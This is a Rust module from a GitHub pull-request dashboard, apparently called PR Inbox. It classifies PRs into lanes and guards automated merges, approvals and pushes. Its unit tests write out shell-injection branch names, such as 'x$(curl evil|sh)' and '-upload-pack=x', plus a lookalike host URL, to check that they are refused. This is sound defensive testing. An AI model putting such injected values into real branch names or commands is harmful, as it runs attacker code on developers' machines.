// GitHub: one GraphQL call through the gh CLI returns your open PRs plus other people's on your plate: waiting
// on your review, assigned to you, or reviewed by you and still open.
// `Pr` is the contract the page, the prompts and this module share.
use serde::{Deserialize, Serialize};
use serde_json::Value;
use std::collections::{HashMap, HashSet};
use std::time::Duration;

use crate::util::{first_line, now_ms, sh, utc_iso};

/// Declared from least to most severe, so the worst check decides a PR's CI.
#[derive(Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Serialize, Deserialize, Default, Debug)]
#[serde(rename_all = "lowercase")]
pub enum Ci {
    #[default]
    None,
    Pass,
    Running,
    Fail,
}

// The variant names spell GitHub's MergeableState values, MERGEABLE included.
#[allow(clippy::enum_variant_names)]
#[derive(Clone, Copy, PartialEq, Eq, Serialize, Deserialize, Default, Debug)]
#[serde(rename_all = "SCREAMING_SNAKE_CASE")]
pub enum Mergeable {
    Mergeable,
    Conflicting,
    #[default]
    #[serde(other)]
    Unknown,
}

#[derive(Clone, Copy, PartialEq, Eq, Serialize, Deserialize, Default, Debug)]
#[serde(rename_all = "SCREAMING_SNAKE_CASE")]
pub enum MergeState {
    Behind,
    Blocked,
    Clean,
    Dirty,
    Draft,
    HasHooks,
    Unstable,
    #[default]
    #[serde(other)]
    Unknown,
}

#[derive(Clone, Copy, PartialEq, Eq, Serialize, Deserialize, Debug)]
#[serde(rename_all = "SCREAMING_SNAKE_CASE")]
pub enum ReviewDecision {
    Approved,
    ChangesRequested,
    ReviewRequired,
}

/// Your latest review on someone else's PR, as GitHub names its state.
#[derive(Clone, Copy, PartialEq, Eq, Serialize, Deserialize, Debug)]
#[serde(rename_all = "SCREAMING_SNAKE_CASE")]
pub enum YourReview {
    Approved,
    ChangesRequested,
    Commented,
    Dismissed,
    Pending,
}

/// The bucket a PR lands in on the page; the ids are the page's LANES ids.
#[derive(Clone, Copy, PartialEq, Eq, Serialize, Debug, Default)]
#[serde(rename_all = "lowercase")]
pub enum Lane {
    #[default]
    Ready,
    Waiting,
    /// Someone else's PR you reviewed, no longer waiting on you; it stays until it is merged or closed.
    Reviewed,
    Fix,
    Changes,
    Behind,
    Conflict,
    Review,
    Checking,
    Draft,
    Stale,
}

#[derive(Clone, Serialize, Debug, PartialEq)]
pub struct Check {
    pub name: String,
    pub url: Option<String>,
    /// True when the check was cancelled rather than failed: the fix is usually a re-run.
    pub cancelled: bool,
}

#[derive(Clone, Serialize, Default, Debug)]
#[serde(rename_all = "camelCase")]
pub struct Pr {
    pub repo: String,
    pub name: String,
    pub number: u64,
    pub title: String,
    pub url: String,
    pub author: String,
    pub is_draft: bool,
    /// Opened from a fork: the head branch lives in another repository than `repo`.
    pub is_cross_repo: bool,
    pub created_at: String,
    pub updated_at: String,
    pub additions: u64,
    pub deletions: u64,
    pub files: u64,
    pub mergeable: Mergeable,
    pub merge_state: MergeState,
    pub review: Option<ReviewDecision>,
    /// People and teams asked to review who have not yet.
    pub reviewers: Vec<String>,
    pub labels: Vec<String>,
    pub open_threads: u64,
    pub head: String,
    pub head_sha: String,
    /// When the head commit was made; empty when GitHub did not say.
    pub committed_at: String,
    pub base: String,
    pub ci: Ci,
    pub failing: Vec<Check>,
    /// Decided when the list is fetched: `classify` for your PRs, Waiting for the rest.
    pub lane: Lane,
    /// A run may change code and push on this PR: `write_refusal` has nothing against it.
    pub writable: bool,
    /// You are an admin of the repo, so you can merge past its branch protection.
    pub can_admin: bool,
    /// An admin merge may take this PR: `admin_merge_refusal` has nothing against it.
    pub admin_mergeable: bool,
    /// Your latest review on it, if any. An approval may still leave the PR needing someone else's.
    pub your_review: Option<YourReview>,
    /// The Approve run may take this PR: `approve_refusal` has nothing against it.
    pub approvable: bool,
}

impl Pr {
    /// Why a run that changes code and pushes must not work on this PR, checked before anything touches
    /// git and whether or not the repo is cloned here.
    pub fn write_refusal(&self) -> Option<String> {
        if self.is_cross_repo {
            return Some("This PR comes from a fork, so its branch is not on this repo's origin. Open it in Terminal instead.".into());
        }
        for (what, name) in [("branch", &self.head), ("base branch", &self.base)] {
            if !safe_ref(name) {
                return Some(format!("The {what} name '{name}' has characters PR Inbox will not hand to an auto-mode run."));
            }
        }
        None
    }

    /// Why an admin merge, which skips the required approval and the up-to-date rule, must not take this
    /// PR. It is only for your own PR whose checks all passed, with no conflicts and no changes requested,
    /// held back by nothing but a missing approval or a branch behind its base.
    pub fn admin_merge_refusal(&self) -> Option<&'static str> {
        if !self.can_admin {
            return Some("You are not an admin of this repo");
        }
        if !matches!(self.lane, Lane::Behind | Lane::Review) {
            return Some("Only a PR held back by its approval or by being behind its base can be admin-merged");
        }
        if self.ci != Ci::Pass {
            return Some("Not all of its checks have passed");
        }
        if self.mergeable != Mergeable::Mergeable {
            return Some("It has conflicts, or GitHub has not worked out whether it can merge");
        }
        if self.review == Some(ReviewDecision::ChangesRequested) {
            return Some("A reviewer asked for changes");
        }
        if self.merge_state != MergeState::Behind && self.review != Some(ReviewDecision::ReviewRequired) {
            return Some("Another branch rule blocks it, not its approval or being behind");
        }
        None
    }

    /// Why the Approve run, which reviews someone else's PR and approves it from your account, must not take
    /// this PR. Your approval stands while the PR waits for another reviewer's, so it is offered again only
    /// once someone asks for your review again.
    pub fn approve_refusal(&self) -> Option<&'static str> {
        if !matches!(self.lane, Lane::Waiting | Lane::Reviewed) {
            return Some("Only someone else's PR can be approved");
        }
        if self.your_review == Some(YourReview::Approved) && self.lane == Lane::Reviewed {
            return Some("You already approved it, and nobody has asked for your review again");
        }
        None
    }
}

#[derive(Serialize, Clone, Default)]
#[serde(rename_all = "camelCase")]
pub struct Snapshot {
    pub fetched_at: u64,
    pub login: String,
    pub mine: Vec<Pr>,
    /// Other people's open PRs, in lane Waiting (your review is requested, or it is assigned to you) or
    /// Reviewed (you reviewed it).
    pub others: Vec<Pr>,
    /// A GraphQL error that left part of the data out; the rest is still shown.
    pub warning: Option<String>,
    /// GitHub is still working out whether one of your PRs can merge, so a refetch soon will differ.
    pub settling: bool,
}

impl Snapshot {
    pub fn find(&self, url: &str) -> Option<&Pr> {
        self.mine.iter().chain(&self.others).find(|p| p.url == url)
    }
}

const FIELDS: &str = r#"
  number title url isDraft isCrossRepository createdAt updatedAt additions deletions changedFiles
  mergeable mergeStateStatus reviewDecision headRefName headRefOid baseRefName
  author { login }
  repository { nameWithOwner name isArchived viewerPermission }
  reviewRequests(first: 10) { nodes { requestedReviewer { ... on User { login } ... on Team { name } } } }
  reviewThreads(first: 100) { nodes { isResolved } }
  labels(first: 20) { nodes { name } }
  viewerLatestReview { state }
  commits(last: 1) { nodes { commit { committedDate statusCheckRollup { state contexts(first: 100) { nodes {
    __typename
    ... on CheckRun { name conclusion status detailsUrl startedAt completedAt }
    ... on StatusContext { context state targetUrl createdAt }
  } } } } } }"#;

fn query() -> String {
    format!(
        r#"query($q1: String!, $q2: String!, $q3: String!) {{
  viewer {{ login pullRequests(states: OPEN, first: 100, orderBy: {{field: UPDATED_AT, direction: DESC}}) {{ nodes {{ {FIELDS} }} }} }}
  reviews: search(query: $q1, type: ISSUE, first: 50) {{ nodes {{ ... on PullRequest {{ {FIELDS} }} }} }}
  assigned: search(query: $q2, type: ISSUE, first: 50) {{ nodes {{ ... on PullRequest {{ {FIELDS} }} }} }}
  reviewed: search(query: $q3, type: ISSUE, first: 50) {{ nodes {{ ... on PullRequest {{ {FIELDS} }} }} }}
}}"#
    )
}

const FAILED: [&str; 6] = ["FAILURE", "TIMED_OUT", "STARTUP_FAILURE", "ACTION_REQUIRED", "ERROR", "CANCELLED"];

fn text(v: &Value, ptr: &str) -> String {
    v.pointer(ptr).and_then(Value::as_str).unwrap_or("").to_string()
}

fn count(v: &Value, key: &str) -> u64 {
    v[key].as_u64().unwrap_or(0)
}

/// One check as GitHub last reported it: a CheckRun or a commit StatusContext.
struct Latest<'a> {
    name: &'a str,
    ci: Ci,
    cancelled: bool,
    url: Option<&'a str>,
    at: &'a str,
}

/// A check conclusion, a StatusContext state or a rollup state.
fn ci_of(state: &str) -> Ci {
    match state {
        s if FAILED.contains(&s) => Ci::Fail,
        "PENDING" | "EXPECTED" => Ci::Running,
        _ => Ci::Pass,
    }
}

/// A check re-run on the same commit shows up once per run. Keep the newest per name, so a check that
/// failed and then passed after a re-run counts as passed.
fn latest_checks(contexts: &[Value]) -> Vec<Latest<'_>> {
    let mut by_name: HashMap<&str, Latest> = HashMap::new();
    for c in contexts {
        let check = if c["__typename"] == "CheckRun" {
            let conclusion = c["conclusion"].as_str().unwrap_or("");
            let (ci, cancelled) = match c["status"].as_str() {
                Some("COMPLETED") => (ci_of(conclusion), conclusion == "CANCELLED"),
                None | Some("PENDING" | "QUEUED" | "IN_PROGRESS") => (Ci::Running, false),
                // WAITING and REQUESTED have always counted as passing; changing that is a separate decision.
                Some(_) => (Ci::Pass, false),
            };
            Latest {
                name: c["name"].as_str().unwrap_or("check"),
                ci,
                cancelled,
                url: c["detailsUrl"].as_str(),
                at: c["completedAt"].as_str().or(c["startedAt"].as_str()).unwrap_or(""),
            }
        } else {
            let state = c["state"].as_str().unwrap_or("");
            Latest { name: c["context"].as_str().unwrap_or("status"), ci: ci_of(state), cancelled: false, url: c["targetUrl"].as_str(), at: c["createdAt"].as_str().unwrap_or("") }
        };
        // RFC 3339 timestamps from one API sort as strings; a still-running check has none and wins.
        let newer = by_name.get(check.name).is_none_or(|old| check.at.is_empty() || (!old.at.is_empty() && check.at > old.at));
        if newer {
            by_name.insert(check.name, check);
        }
    }
    let mut checks: Vec<Latest> = by_name.into_values().collect();
    checks.sort_by(|a, b| a.name.cmp(b.name));
    checks
}

/// Adapts one GraphQL PullRequest node to the `Pr` contract.
fn to_pr(n: &Value) -> Pr {
    let rollup = n.pointer("/commits/nodes/0/commit/statusCheckRollup").unwrap_or(&Value::Null);
    let contexts = rollup.pointer("/contexts/nodes").and_then(Value::as_array).cloned().unwrap_or_default();
    let checks = latest_checks(&contexts);
    let failing: Vec<Check> = checks
        .iter()
        .filter(|c| c.ci == Ci::Fail)
        .map(|c| Check { name: c.name.to_string(), url: c.url.filter(|u| u.starts_with("https://")).map(String::from), cancelled: c.cancelled })
        .collect();
    let ci = checks.iter().map(|c| c.ci).max().or_else(|| rollup["state"].as_str().map(ci_of)).unwrap_or_default();
    let nodes = |ptr: &str| n.pointer(ptr).and_then(Value::as_array).cloned().unwrap_or_default();
    let mut pr = Pr {
        repo: text(n, "/repository/nameWithOwner"),
        name: text(n, "/repository/name"),
        number: count(n, "number"),
        title: text(n, "/title"),
        url: text(n, "/url"),
        author: n.pointer("/author/login").and_then(Value::as_str).unwrap_or("ghost").to_string(),
        is_draft: n["isDraft"] == true,
        is_cross_repo: n["isCrossRepository"] == true,
        created_at: text(n, "/createdAt"),
        updated_at: text(n, "/updatedAt"),
        additions: count(n, "additions"),
        deletions: count(n, "deletions"),
        files: count(n, "changedFiles"),
        // A value this binary does not know reads as UNKNOWN, or as no review decision.
        mergeable: serde_json::from_value(n["mergeable"].clone()).unwrap_or_default(),
        merge_state: serde_json::from_value(n["mergeStateStatus"].clone()).unwrap_or_default(),
        review: serde_json::from_value(n["reviewDecision"].clone()).unwrap_or_default(),
        reviewers: nodes("/reviewRequests/nodes")
            .iter()
            .filter_map(|r| r.pointer("/requestedReviewer/login").or(r.pointer("/requestedReviewer/name")).and_then(Value::as_str).map(String::from))
            .collect(),
        labels: nodes("/labels/nodes").iter().filter_map(|l| l["name"].as_str().map(String::from)).collect(),
        open_threads: nodes("/reviewThreads/nodes").iter().filter(|t| t["isResolved"] == false).count() as u64,
        head: text(n, "/headRefName"),
        head_sha: text(n, "/headRefOid"),
        committed_at: text(n, "/commits/nodes/0/commit/committedDate"),
        base: text(n, "/baseRefName"),
        ci,
        failing,
        lane: Lane::default(),
        writable: false,
        can_admin: text(n, "/repository/viewerPermission") == "ADMIN",
        admin_mergeable: false,
        // No review, or a state this binary does not know, reads as None.
        your_review: serde_json::from_value(n["viewerLatestReview"]["state"].clone()).ok(),
        approvable: false,
    };
    pr.writable = pr.write_refusal().is_none();
    pr
}

/// Which bucket one of your PRs belongs in: the first rule that matches wins. A PR last updated at or
/// before `stale_cutoff` can go stale; a head commit made after `fresh_cutoff` may not have reported checks yet.
fn classify(pr: &Pr, stale_cutoff: &str, fresh_cutoff: &str) -> Lane {
    let stale = !pr.updated_at.is_empty() && pr.updated_at.as_str() <= stale_cutoff;
    if stale && (pr.mergeable == Mergeable::Conflicting || pr.is_draft) {
        return Lane::Stale;
    }
    // UNSTABLE means only checks GitHub does not require are failing: the PR can still merge.
    if pr.ci == Ci::Fail && pr.merge_state != MergeState::Unstable {
        return Lane::Fix;
    }
    if pr.mergeable == Mergeable::Conflicting {
        return Lane::Conflict;
    }
    if pr.ci == Ci::Running || pr.mergeable == Mergeable::Unknown {
        return Lane::Checking;
    }
    if pr.is_draft {
        return Lane::Draft;
    }
    if pr.review == Some(ReviewDecision::ChangesRequested) {
        return Lane::Changes;
    }
    if pr.merge_state == MergeState::Behind {
        return Lane::Behind;
    }
    if pr.review == Some(ReviewDecision::ReviewRequired) || pr.merge_state == MergeState::Blocked {
        return Lane::Review;
    }
    // A fresh push has no checks until CI picks it up, so it waits before it is offered to Merge all. An
    // older commit with none stays Ready: some repos and paths never run CI, and the row says "No checks".
    if pr.ci == Ci::None && pr.committed_at.as_str() > fresh_cutoff {
        return Lane::Checking;
    }
    Lane::Ready
}

/// Builds the snapshot from a GraphQL response. A response with errors still carries the data it could
/// resolve (failed nodes come back null), so it is shown with a warning rather than dropped.
pub fn parse_snapshot(doc: &Value) -> Result<Snapshot, String> {
    let warning = doc["errors"].as_array().and_then(|e| e.first()).and_then(|e| e["message"].as_str()).map(String::from);
    if doc["data"].is_null() {
        return Err(warning.unwrap_or_else(|| "GitHub returned no data".into()));
    }
    let now = now_ms();
    let stale_cutoff = utc_iso(now.saturating_sub(7 * 86_400_000));
    let fresh_cutoff = utc_iso(now.saturating_sub(15 * 60_000));
    let live = |n: &&Value| n["url"].is_string() && n.pointer("/repository/isArchived") != Some(&Value::Bool(true));
    let nodes = |ptr: &str| doc.pointer(ptr).and_then(Value::as_array).cloned().unwrap_or_default();
    let mut mine: Vec<Pr> = nodes("/data/viewer/pullRequests/nodes").iter().filter(live).map(to_pr).collect();
    for pr in &mut mine {
        pr.lane = classify(pr, &stale_cutoff, &fresh_cutoff);
        pr.admin_mergeable = pr.admin_merge_refusal().is_none();
    }
    // Each PR is listed once, in the first list that has it: a reviewed PR whose review is requested again waits.
    let mut seen: HashSet<String> = mine.iter().map(|p| p.url.clone()).collect();
    let others: Vec<Pr> = [("/data/reviews/nodes", Lane::Waiting), ("/data/assigned/nodes", Lane::Waiting), ("/data/reviewed/nodes", Lane::Reviewed)]
        .iter()
        .flat_map(|&(ptr, lane)| nodes(ptr).into_iter().map(move |n| (n, lane)))
        .filter(|(n, _)| live(&n) && n["url"].as_str().is_some_and(|u| seen.insert(u.to_string())))
        .map(|(n, lane)| {
            let mut pr = Pr { lane, ..to_pr(&n) };
            pr.approvable = pr.approve_refusal().is_none();
            pr
        })
        .collect();
    let settling = mine.iter().any(|p| p.mergeable == Mergeable::Unknown);
    Ok(Snapshot { fetched_at: now, login: text(doc, "/data/viewer/login"), mine, others, warning, settling })
}

pub async fn fetch_prs() -> Result<Snapshot, String> {
    let q = format!("query={}", query());
    let out = sh(
        "gh",
        &[
            "api", "graphql", "-f", &q,
            "-f", "q1=is:open is:pr archived:false review-requested:@me",
            "-f", "q2=is:open is:pr archived:false assignee:@me -author:@me",
            "-f", "q3=is:open is:pr archived:false reviewed-by:@me -author:@me",
        ],
        Duration::from_secs(60),
    )
    .await;
    // gh exits 1 when the response carries any GraphQL error, even next to complete data.
    match serde_json::from_str::<Value>(&out.stdout) {
        Ok(doc) if doc.get("data").is_some() => parse_snapshot(&doc),
        _ => {
            let msg = first_line(&out.stderr);
            Err(if msg.is_empty() { format!("gh exited with {}", out.code) } else { msg })
        }
    }
}

/// The last PR list, shared by the page, the run starter and the morning summary, so a run is always
/// described by what GitHub says now rather than by what a page fetched minutes ago.
#[derive(Default)]
pub struct Cache {
    last: std::sync::Mutex<Option<Snapshot>>,
}

impl Cache {
    pub async fn refresh(&self) -> Result<Snapshot, String> {
        let snap = fetch_prs().await?;
        *self.last.lock().unwrap() = Some(snap.clone());
        Ok(snap)
    }

    /// The cached list while it is under a minute old, otherwise a fresh one.
    pub async fn recent(&self) -> Result<Snapshot, String> {
        const MAX_AGE_MS: u64 = 60_000;
        let cached = self.last.lock().unwrap().clone().filter(|s| now_ms().saturating_sub(s.fetched_at) < MAX_AGE_MS);
        match cached {
            Some(snap) => Ok(snap),
            None => self.refresh().await,
        }
    }

    /// An open PR as GitHub has it now: from the recent list, or from a fresh one when the recent list
    /// lacks it. None when it is no longer open.
    pub async fn open_pr(&self, url: &str) -> Result<Option<Pr>, String> {
        let snap = self.recent().await?;
        if let Some(pr) = snap.find(url) {
            return Ok(Some(pr.clone()));
        }
        Ok(self.refresh().await.ok().and_then(|s| s.find(url).cloned()))
    }
}

pub fn is_pr_url(url: &str) -> bool {
    let Some(rest) = url.strip_prefix("https://github.com/") else { return false };
    let word = |p: &str| !p.is_empty() && p.chars().all(|c| c.is_ascii_alphanumeric() || "._-".contains(c));
    matches!(rest.split('/').collect::<Vec<_>>()[..], [owner, repo, "pull", n] if word(owner) && word(repo) && !n.is_empty() && n.chars().all(|c| c.is_ascii_digit()))
}

/// Branch names a background run may type into a shell. Git and GitHub accept `$`, backticks, `;` and a
/// leading `-` in ref names; a run in auto mode pastes the name into Bash, so anything else is refused.
pub fn safe_ref(name: &str) -> bool {
    !name.is_empty()
        && !name.starts_with('-')
        && !name.contains("..")
        && name.chars().all(|c| c.is_ascii_alphanumeric() || "._/-".contains(c))
}

/// A full 40-character commit id, the only form a merge pin or a review record accepts.
pub fn is_full_sha(s: &str) -> bool {
    s.len() == 40 && s.bytes().all(|b| b.is_ascii_hexdigit())
}

/// The gh actions the page can run on a PR.
#[derive(Clone, Copy, PartialEq, Eq, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum PrAction {
    Merge,
    /// A merge with your admin rights, past the required approval and the up-to-date rule.
    #[serde(rename = "admin-merge")]
    AdminMerge,
    Update,
    Ready,
    Close,
}

impl PrAction {
    /// `head_sha` pins a merge to the commit the page showed, so a push in between makes GitHub refuse.
    /// A merge without it is refused here rather than run unpinned.
    pub fn gh_args<'a>(self, url: &'a str, head_sha: Option<&'a str>) -> Result<Vec<&'a str>, String> {
        Ok(match self {
            PrAction::Merge | PrAction::AdminMerge => match head_sha.filter(|s| is_full_sha(s)) {
                Some(sha) if self == PrAction::AdminMerge => vec!["pr", "merge", url, "--squash", "--admin", "--match-head-commit", sha],
                Some(sha) => vec!["pr", "merge", url, "--squash", "--match-head-commit", sha],
                None => return Err("A merge needs the PR's full head commit id".into()),
            },
            PrAction::Update => vec!["pr", "update-branch", url],
            PrAction::Ready => vec!["pr", "ready", url],
            PrAction::Close => vec!["pr", "close", url],
        })
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    fn run(name: &str, conclusion: &str, completed: &str) -> Value {
        json!({ "__typename": "CheckRun", "name": name, "status": "COMPLETED", "conclusion": conclusion, "completedAt": completed, "detailsUrl": "https://github.com/x" })
    }

    fn pr_with(contexts: Vec<Value>, rollup: &str) -> Pr {
        to_pr(&json!({ "url": "u", "commits": { "nodes": [{ "commit": { "statusCheckRollup": { "state": rollup, "contexts": { "nodes": contexts } } } }] } }))
    }

    #[test]
    fn a_rerun_that_passed_replaces_the_failure_it_superseded() {
        let pr = pr_with(vec![run("check-title", "FAILURE", "2026-10-07T09:00:00Z"), run("check-title", "SUCCESS", "2026-10-07T09:05:00Z")], "FAILURE");
        assert_eq!(pr.ci, Ci::Pass);
        assert!(pr.failing.is_empty());
    }

    #[test]
    fn a_cancelled_check_is_named_as_cancelled() {
        let pr = pr_with(vec![run("build", "CANCELLED", "2026-10-07T09:00:00Z")], "FAILURE");
        assert_eq!(pr.ci, Ci::Fail);
        assert_eq!(pr.failing, vec![Check { name: "build".into(), url: Some("https://github.com/x".into()), cancelled: true }]);
    }

    #[test]
    fn a_running_check_keeps_ci_running_until_it_finishes() {
        let running = json!({ "__typename": "CheckRun", "name": "test", "status": "IN_PROGRESS", "conclusion": null, "startedAt": "2026-10-07T09:10:00Z" });
        let pr = pr_with(vec![run("test", "FAILURE", "2026-10-07T09:00:00Z"), running], "PENDING");
        assert_eq!(pr.ci, Ci::Running);
    }

    #[test]
    fn graphql_errors_keep_the_data_that_resolved() {
        let doc = json!({ "data": { "viewer": { "login": "me", "pullRequests": { "nodes": [{ "url": "https://github.com/a/b/pull/1", "repository": { "isArchived": false } }, null] } }, "reviews": { "nodes": [] }, "assigned": { "nodes": [] } }, "errors": [{ "message": "SAML" }] });
        let snap = parse_snapshot(&doc).unwrap();
        assert_eq!(snap.mine.len(), 1);
        assert_eq!(snap.warning.as_deref(), Some("SAML"));
    }

    #[test]
    fn archived_repos_are_left_out() {
        let doc = json!({ "data": { "viewer": { "login": "me", "pullRequests": { "nodes": [{ "url": "https://github.com/a/b/pull/1", "repository": { "isArchived": true } }] } }, "reviews": { "nodes": [] }, "assigned": { "nodes": [] } } });
        assert!(parse_snapshot(&doc).unwrap().mine.is_empty());
    }

    #[test]
    fn a_reviewed_pr_stays_until_closed_and_waits_again_when_re_requested() {
        let pr = |n: u64| json!({ "url": format!("https://github.com/o/r/pull/{n}"), "repository": { "isArchived": false } });
        let doc = json!({ "data": { "viewer": { "login": "me", "pullRequests": { "nodes": [pr(1)] } },
            "reviews": { "nodes": [pr(2)] }, "assigned": { "nodes": [] }, "reviewed": { "nodes": [pr(1), pr(2), pr(3)] } } });
        let lanes: Vec<(String, Lane)> = parse_snapshot(&doc).unwrap().others.into_iter().map(|p| (p.url, p.lane)).collect();
        assert_eq!(lanes, [("https://github.com/o/r/pull/2".into(), Lane::Waiting), ("https://github.com/o/r/pull/3".into(), Lane::Reviewed)]);
    }

    #[test]
    fn your_approval_holds_until_your_review_is_asked_for_again() {
        let pr = |n: u64, state: &str| json!({ "number": n, "url": format!("https://github.com/o/r/pull/{n}"), "repository": { "isArchived": false }, "viewerLatestReview": { "state": state } });
        let doc = json!({ "data": { "viewer": { "login": "me", "pullRequests": { "nodes": [] } },
            "reviews": { "nodes": [pr(1, "APPROVED")] }, "assigned": { "nodes": [] },
            "reviewed": { "nodes": [pr(1, "APPROVED"), pr(2, "APPROVED"), pr(3, "COMMENTED")] } } });
        let got: Vec<(u64, Option<YourReview>, bool)> = parse_snapshot(&doc).unwrap().others.iter().map(|p| (p.number, p.your_review, p.approvable)).collect();
        // #1 asks for your review again, #2 waits on someone else's approval, #3 you only commented on.
        assert_eq!(got, [(1, Some(YourReview::Approved), true), (2, Some(YourReview::Approved), false), (3, Some(YourReview::Commented), true)]);
        assert_eq!(to_pr(&json!({ "viewerLatestReview": { "state": "CHANGES_REQUESTED" } })).your_review, Some(YourReview::ChangesRequested));
        assert_eq!(to_pr(&json!({ "viewerLatestReview": null })).your_review, None);
        let yours = Pr { lane: Lane::Ready, ..Default::default() };
        assert_eq!(yours.approve_refusal(), Some("Only someone else's PR can be approved"));
    }

    #[test]
    fn shell_payloads_in_branch_names_are_refused() {
        assert!(safe_ref("claude/fix-ci_2.0"));
        for bad in ["x$(curl evil|sh)", "-upload-pack=x", "a;b", "a`b`", "a b", "a..b", ""] {
            assert!(!safe_ref(bad), "{bad}");
        }
    }

    #[test]
    fn writes_are_refused_for_forks_and_unsafe_branch_names() {
        let safe = || to_pr(&json!({ "url": "u", "headRefName": "claude/fix-ci", "baseRefName": "main" }));
        assert_eq!(safe().write_refusal(), None);
        assert!(safe().writable);
        let fork = to_pr(&json!({ "url": "u", "headRefName": "feat", "baseRefName": "main", "isCrossRepository": true }));
        assert!(fork.write_refusal().is_some_and(|why| why.contains("comes from a fork")));
        assert!(!fork.writable);
        let head = Pr { head: "x$(curl evil|sh)".into(), ..safe() };
        assert_eq!(head.write_refusal().as_deref(), Some("The branch name 'x$(curl evil|sh)' has characters PR Inbox will not hand to an auto-mode run."));
        let base = Pr { base: "-upload-pack=x".into(), ..safe() };
        assert!(base.write_refusal().is_some_and(|why| why.starts_with("The base branch name '-upload-pack=x'")));
    }

    #[test]
    fn only_a_plain_github_pr_url_passes() {
        assert!(is_pr_url("https://github.com/o/r/pull/12"));
        let bad = [
            "https://github.com/o/r/pull/1/files",
            "https://github.com/o/r/issues/1",
            "http://github.com/o/r/pull/1",
            "https://github.com.evil.com/o/r/pull/1",
            "https://github.com/o/r/pull/",
            "https://github.com/o/r/pull/1?x=1",
            "https://github.com/o/r/pull/1a",
        ];
        for url in bad {
            assert!(!is_pr_url(url), "{url}");
        }
    }

    #[test]
    fn a_merge_without_a_full_head_sha_is_refused() {
        let sha = "a".repeat(40);
        assert!(PrAction::Merge.gh_args("u", Some(&sha)).unwrap().contains(&"--match-head-commit"));
        assert!(PrAction::Merge.gh_args("u", Some("abc")).is_err());
        assert!(PrAction::Merge.gh_args("u", None).is_err());
        assert!(PrAction::Update.gh_args("u", None).is_ok());
        assert!(!PrAction::Merge.gh_args("u", Some(&sha)).unwrap().contains(&"--admin"));
        assert_eq!(PrAction::AdminMerge.gh_args("u", Some(&sha)).unwrap(), ["pr", "merge", "u", "--squash", "--admin", "--match-head-commit", sha.as_str()]);
        assert!(PrAction::AdminMerge.gh_args("u", None).is_err());
        assert!(matches!(serde_json::from_value(json!("admin-merge")), Ok(PrAction::AdminMerge)));
    }

    #[test]
    fn only_a_green_pr_held_back_by_approval_or_being_behind_can_be_admin_merged() {
        let held = || Pr {
            can_admin: true,
            lane: Lane::Behind,
            ci: Ci::Pass,
            mergeable: Mergeable::Mergeable,
            merge_state: MergeState::Behind,
            review: Some(ReviewDecision::ReviewRequired),
            ..Default::default()
        };
        assert_eq!(held().admin_merge_refusal(), None);
        assert_eq!(Pr { lane: Lane::Review, merge_state: MergeState::Blocked, ..held() }.admin_merge_refusal(), None);
        assert_eq!(Pr { review: None, ..held() }.admin_merge_refusal(), None);
        let refused = [
            ("not an admin", Pr { can_admin: false, ..held() }),
            ("ready anyway", Pr { lane: Lane::Ready, ..held() }),
            ("someone else's", Pr { lane: Lane::Waiting, ..held() }),
            ("checks running", Pr { ci: Ci::Running, ..held() }),
            ("no checks", Pr { ci: Ci::None, ..held() }),
            ("optional check failing", Pr { ci: Ci::Fail, ..held() }),
            ("mergeability unknown", Pr { mergeable: Mergeable::Unknown, ..held() }),
            ("changes requested", Pr { review: Some(ReviewDecision::ChangesRequested), ..held() }),
            ("blocked by another rule", Pr { lane: Lane::Review, merge_state: MergeState::Blocked, review: None, ..held() }),
        ];
        for (name, pr) in refused {
            assert!(pr.admin_merge_refusal().is_some(), "{name}");
        }
    }

    #[test]
    fn admin_rights_come_from_the_viewers_repo_permission() {
        let pr = |perm: &str| to_pr(&json!({ "url": "u", "repository": { "viewerPermission": perm } }));
        assert!(pr("ADMIN").can_admin);
        assert!(!pr("MAINTAIN").can_admin);
    }

    #[test]
    fn each_pr_lands_in_the_first_lane_whose_rule_matches() {
        const STALE: &str = "2026-09-30T12:00:00Z";
        const FRESH: &str = "2026-10-07T11:45:00Z";
        let green = || Pr {
            mergeable: Mergeable::Mergeable,
            merge_state: MergeState::Clean,
            ci: Ci::Pass,
            updated_at: "2026-10-07T11:00:00Z".into(),
            committed_at: "2026-10-07T10:00:00Z".into(),
            ..Default::default()
        };
        let cases = [
            ("green and clean", green(), Lane::Ready),
            ("conflict updated at the cutoff", Pr { updated_at: STALE.into(), mergeable: Mergeable::Conflicting, ..green() }, Lane::Stale),
            ("conflict updated just after it", Pr { updated_at: "2026-09-30T12:00:01Z".into(), mergeable: Mergeable::Conflicting, ..green() }, Lane::Conflict),
            ("old draft", Pr { updated_at: "2026-09-01T00:00:00Z".into(), is_draft: true, ..green() }, Lane::Stale),
            ("old but mergeable", Pr { updated_at: "2026-09-01T00:00:00Z".into(), ..green() }, Lane::Ready),
            ("required check failing", Pr { ci: Ci::Fail, merge_state: MergeState::Blocked, ..green() }, Lane::Fix),
            ("optional check failing", Pr { ci: Ci::Fail, merge_state: MergeState::Unstable, ..green() }, Lane::Ready),
            ("conflict", Pr { mergeable: Mergeable::Conflicting, merge_state: MergeState::Dirty, ..green() }, Lane::Conflict),
            ("checks running", Pr { ci: Ci::Running, ..green() }, Lane::Checking),
            ("mergeability unknown", Pr { mergeable: Mergeable::Unknown, merge_state: MergeState::Unknown, ..green() }, Lane::Checking),
            ("draft", Pr { is_draft: true, merge_state: MergeState::Draft, ..green() }, Lane::Draft),
            ("changes requested", Pr { review: Some(ReviewDecision::ChangesRequested), merge_state: MergeState::Blocked, ..green() }, Lane::Changes),
            ("behind", Pr { merge_state: MergeState::Behind, ..green() }, Lane::Behind),
            ("needs approval", Pr { review: Some(ReviewDecision::ReviewRequired), ..green() }, Lane::Review),
            ("blocked by another rule", Pr { merge_state: MergeState::Blocked, ..green() }, Lane::Review),
            ("no checks on a fresh commit", Pr { ci: Ci::None, committed_at: "2026-10-07T11:50:00Z".into(), ..green() }, Lane::Checking),
            ("no checks, committed at the fresh cutoff", Pr { ci: Ci::None, committed_at: FRESH.into(), ..green() }, Lane::Ready),
            ("no checks on an older commit", Pr { ci: Ci::None, ..green() }, Lane::Ready),
            ("no checks, no commit date", Pr { ci: Ci::None, committed_at: String::new(), ..green() }, Lane::Ready),
        ];
        for (name, pr, want) in cases {
            assert_eq!(classify(&pr, STALE, FRESH), want, "{name}");
        }
    }

    #[test]
    fn waiting_prs_keep_their_lane_and_an_unknown_mergeable_marks_the_list_settling() {
